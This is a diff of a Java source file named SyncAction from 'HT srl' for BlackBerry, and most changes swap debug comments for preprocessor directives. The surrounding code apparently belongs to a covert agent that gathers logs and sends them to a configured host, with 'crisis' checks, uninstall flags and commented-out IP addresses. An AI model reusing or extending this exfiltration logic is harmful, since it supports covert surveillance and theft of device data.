@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -26,8 +27,9 @@ import blackberry.utils.WChar;
  * The Class SyncAction.
  */
 public class SyncAction extends SubAction {
-    // #debug
+    //#ifdef DEBUG
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
+    //#endif
 
     LogCollector logCollector;
     AgentManager agentManager;
@@ -55,9 +57,9 @@ public class SyncAction extends SubAction {
         this(actionId_);
         parse(confParams);
 
-        // #ifdef DBC
+        //#ifdef DBC
         Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
-        // #endif
+        //#endif
 
         logCollector = LogCollector.getInstance();
         agentManager = AgentManager.getInstance();
@@ -84,13 +86,15 @@ public class SyncAction extends SubAction {
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
     public boolean execute(final Event triggeringEvent) {
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("SyncAction execute: " + triggeringEvent);
+        //#endif
 
         synchronized (this) {
             if (syncying) {
-                // #debug
+                //#ifdef DEBUG
                 debug.warn("Already syncing: skipping");
+                //#endif
                 return true;
             } else {
                 syncying = true;
@@ -100,17 +104,18 @@ public class SyncAction extends SubAction {
         try {
 
             if (statusObj.crisis()) {
-                // #debug
+                //#ifdef DEBUG
                 debug.warn("SyncAction - no sync, we are in crisis");
+                //#endif
                 return false;
             }
 
             wantReload = false;
             wantUninstall = false;
 
-            // #ifdef DBC
+            //#ifdef DBC
             Check.asserts(logCollector != null, "logCollector == null");
-            // #endif
+            //#endif
 
             //host = "192.168.1.177";
             //host = "89.96.137.6";
@@ -134,13 +139,15 @@ public class SyncAction extends SubAction {
             wantReload = transfer.reload;
 
             if (ret) {
-                // #debug debug
-                                debug.trace("InternetSend OK");
+                //#ifdef DEBUG_TRACE
+                debug.trace("InternetSend OK");
+                //#endif
                 return true;
             }
 
-            // #debug
+            //#ifdef DEBUG
             debug.error("InternetSend Unable to perform");
+            //#endif
 
             return false;
         } finally {
@@ -170,19 +177,19 @@ public class SyncAction extends SubAction {
             host = WChar.getString(buffer, true);
 
         } catch (final EOFException e) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("params FAILED");
+            //#endif
             return false;
         }
 
-        //#mdebug
+        //#ifdef DEBUG
         StringBuffer sb = new StringBuffer();
         sb.append("gprs: " + gprs);
         sb.append("wifi: " + wifi);
         sb.append("host: " + host);
-        //#debug info
         debug.info(sb.toString());
-        //#enddebug
+        //#endif
 
         return true;
     }
